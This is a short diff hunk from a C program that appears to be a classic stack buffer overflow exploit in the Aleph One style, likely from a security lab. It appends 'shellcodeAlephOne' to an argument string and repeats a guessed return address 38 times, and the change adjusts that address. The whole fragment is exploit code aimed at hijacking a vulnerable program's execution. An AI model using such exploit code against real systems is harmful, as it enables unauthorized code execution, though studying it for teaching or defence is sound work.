@@ -25,7 +25,7 @@ int main(void)
   strcat(str, shellcodeAlephOne);
   for (int i = 0; i < 38; ++i)
   {
-  	strcat(str, "\x20\xfb\xff\xbf");
+  	strcat(str, "\x80\xfb\xff\xbf");
   }
   args[1] = str;
 
